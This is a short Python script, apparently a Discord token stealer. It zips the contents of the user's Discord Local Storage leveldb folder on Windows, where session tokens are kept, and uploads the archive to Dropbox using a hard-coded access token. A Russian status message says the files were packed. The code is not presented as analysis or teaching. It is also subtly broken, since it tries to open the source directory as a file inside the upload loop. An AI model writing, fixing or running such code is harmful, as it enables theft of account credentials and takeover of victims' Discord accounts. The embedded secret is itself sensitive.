import os
import zipfile
import dropbox


def run():
    dbx = dropbox.Dropbox('sl.B5mXeUbaroWs5lizl8CqV7H23iGDY3phCrzTUU3jFTSIwhKqS8Q2Vo0E5MwTrwe5anvlxEUMnWEMGWDVTOa6ZSfomLXw1ewyxSBEIW912ewiOSjBz6HgloZHPfIQkwU71H2XgxvajsWe')
    with zipfile.ZipFile('file.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        username = os.getlogin()
        source_dir = f'C:\Users\{username}\AppData\Roaming\discord\Local Storage\leveldb'
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_dir)
                zipf.write(file_path, arcname)
                file_path = source_dir
                file_name = 'file.zip'
                with open(file_path, 'rb') as f:
                    dbx.files_upload(f.read(), file_name)
            print(f"Файлы из {source_dir} упакованы в архив file.zip")